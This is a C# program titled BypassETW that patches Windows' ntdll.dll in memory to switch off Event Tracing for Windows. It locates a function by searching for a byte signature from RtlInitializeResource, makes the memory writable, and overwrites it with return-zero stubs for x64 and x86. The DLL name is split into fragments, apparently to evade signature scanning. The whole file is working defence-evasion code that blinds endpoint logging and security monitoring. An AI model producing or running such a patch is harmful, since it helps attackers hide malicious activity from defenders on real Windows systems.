using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace BypassETW
{
    public class Program
    {
        static byte[] patch_code_x64 = new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
        static byte[] patch_code_x86 = new byte[] { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
        // public static uint etw_offset_x64 = 0x3DEC0;
        // public static uint etw_offset_x86 = 0x590;
        static byte[] egg_x86 = new byte[] 
        {
            0x8b, 0xff,                                 // mov     edi,edi
            0x55,                                       // push    ebp
            0x8b, 0xec,                                 // mov     ebp,esp
            0x83, 0xe4, 0xf8,                           // and     esp,0FFFFFFF8h
            0x81, 0xec, 0xe0, 0x00, 0x00, 0x00,         // sub     esp,0E0h
            0xa1, 0x70, 0xb3, 0x38, 0x77,               // mov     eax,dword ptr [ntdll!__security_cookie (7738b370)]
            0x33, 0xc4,                                       // xor     eax,esp
            0x89, 0x84, 0x24, 0xdc, 0x00, 0x00, 0x00    // mov     dword ptr [esp+0DCh],eax
        };

        static byte[] egg_x64 = new byte[]
        {
            0x4c, 0x8b, 0xdc,                           // mov     r11,rsp
            0x48, 0x83, 0xec, 0x58,                     // sub     rsp,58h
            0x4d, 0x89, 0x4b, 0xe8,                     // mov     qword ptr [r11-18h],r9
            0x33, 0xc0,                                 // xor     eax,eax
            0x45, 0x89, 0x43, 0xe0,                     // mov     dword ptr [r11-20h],r8d
            0x45, 0x33, 0xc9,                           // xor     r9d,r9d
            0x49, 0x89, 0x43, 0xd8,                     // mov     qword ptr [r11-28h],rax
            0x45, 0x33, 0xc0,                           // xor     r8d,r8d
        };


        [DllImport("kernel32")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        private static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }

        private static IntPtr FindAddress(IntPtr address, byte[] egg, int[] miss_nums = null)
        {
            while (true)
            {
                int count = 0;

                while (true)
                {
                    if (miss_nums.Length != 0)
                    {
                        for (int i = 0; i < miss_nums.Length; i++)
                        {
                            if (miss_nums[i] == count)
                            {
                                count++;
                                address = IntPtr.Add(address, 1);
                                continue;
                            }
                        }

                    }

                    // IntPtr ori_Addr = address;
                    address = IntPtr.Add(address, 1);
                    if (Marshal.ReadByte(address) == (byte)egg.GetValue(count))
                    {
                        count++;
                        if (count == egg.Length)
                            return IntPtr.Subtract(address, egg.Length - 1);
                    }
                    else
                    {
                        break;
                    }
                }
            }
        }


        private static void MemoryPatch(string dllname, string funcname, byte[] egg, byte[] patch, int[] miss_nums = null)
        {     
            uint Oldprotect;
            uint Newprotect;

            IntPtr libAddr = LoadLibrary(dllname);
            IntPtr funcAddr = GetProcAddress(libAddr, funcname);
            IntPtr PatchAddr = IntPtr.Zero;
            // byte temp = Marshal.ReadByte(funcAddr, 1);

            if (miss_nums.Length != 0)
            {
                PatchAddr = FindAddress(funcAddr, egg, miss_nums);
            }
            else
            {
                PatchAddr = FindAddress(funcAddr, egg);
            }

            VirtualProtect(PatchAddr, (UIntPtr)patch.Length, 0x40, out Oldprotect);
            Marshal.Copy(patch, 0, PatchAddr, patch.Length);
            VirtualProtect(PatchAddr, (UIntPtr)patch.Length, Oldprotect, out Newprotect);
        }

        /*
        private static void CodePatchETW()
        {
            StartPatch();
        }
        */

        public static void StartPatch()
        {
            if (is64Bit())
            {
                // Console.WriteLine("x64");
                MemoryPatch("ntd" + "ll.d" + "ll", "RtlInitializeResource", egg_x64, patch_code_x64);
            }
            else
            {
                // Console.WriteLine("x86");
                int[] miss_nums = { 15, 16, 17 };
                MemoryPatch("ntd" + "ll.d" + "ll", "RtlInitializeResource", egg_x86, patch_code_x86, miss_nums);
            }
        }


        static void Main(string[] args)
        {
            StartPatch();
        }
    }
}
